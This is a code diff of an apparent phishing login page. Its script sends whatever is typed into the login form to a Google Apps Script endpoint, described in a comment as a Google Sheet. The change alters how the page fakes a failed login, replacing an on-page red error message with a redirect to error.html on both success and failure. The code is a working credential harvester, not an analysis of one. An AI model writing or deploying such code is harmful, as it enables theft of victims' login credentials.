@@ -249,24 +249,23 @@
     </div>
 
     <script>
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbxaj4pWphw6wCUVFF7vmwuVGqeQ4SENyBNamutM6mdhbk1gLUs12K38NOcEeX92sofzJg/exec';
-        const form = document.getElementById('loginForm');
-        const errorMessage = document.getElementById('errorMessage');
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbxaj4pWphw6wCUVFF7vmwuVGqeQ4SENyBNamutM6mdhbk1gLUs12K38NOcEeX92sofzJg/exec';
+    const form = document.getElementById('loginForm');
 
-        form.addEventListener('submit', e => {
-            e.preventDefault();
+    form.addEventListener('submit', e => {
+        e.preventDefault();
 
-            // Show di red error message
-            errorMessage.style.display = 'block';
-
-            // Send di data na Google Sheet
-            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-                .then(response => {
-                    form.reset();
-                })
-                .catch(error => console.error('Error!', error.message));
-        });
-    </script>
+        // Google Sheet-লৈ ডাটা প্ৰেৰণ কৰাৰ পিছত error.html পেজলৈ ৰিডাইৰেক্ট হ'ব
+        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => {
+                window.location.href = 'error.html'; // ইয়াত error.html লিংক কৰা হৈছে
+            })
+            .catch(error => {
+                // কিবা কাৰণত নেটৱৰ্ক এৰৰ হ'লেও error.html পেজলৈ লৈ যাব
+                window.location.href = 'error.html';
+            });
+    });
+</script>
 
 </body>
 </html>
